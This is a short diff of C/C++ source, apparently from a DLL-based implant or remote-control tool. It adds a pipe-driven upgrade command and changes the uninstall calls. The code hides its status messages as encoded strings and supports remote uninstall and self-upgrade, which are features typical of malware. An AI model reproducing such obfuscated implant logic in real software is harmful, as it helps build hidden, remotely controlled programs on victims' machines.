@@ -306,9 +306,9 @@ DWORD Macro_Unistall(HANDLE hPipe){
 	}
 
 	if(strstr(lpArrayCmdLine[1], "false"))
-		UnistallProc(FALSE);
+		UnistallProc(FALSE, FALSE);
 	else
-		UnistallProc(TRUE);
+		UnistallProc(TRUE, FALSE);
 
 	return TRUE;
 }
@@ -514,6 +514,24 @@ DWORD Macro_ProcSwitcher(HANDLE hPipe){
 
 	if(WaitAndCheckUnloadMutex(60, 1000))
 		UnloadDLL();
+
+	return TRUE;
+}
+
+DWORD Macro_Upgrade(HANDLE hPipe, LPCSTR fpOrig){
+	DecodeString ds;
+	
+	if(!PathFileExists(fpOrig)){
+		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_The_file_for_upgrade_no_exists), FLAG_ERROR);
+		return FALSE;
+	}
+	strcpy(FILE_ORIG_UPGRADE, fpOrig);
+	
+	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Upgrading), NULL);
+
+	ACTIVE_UNISTALL_PROC_BY_DEMAND = TRUE;
+	ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE = FALSE;
+	ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE = TRUE;
 
 	return TRUE;
 }
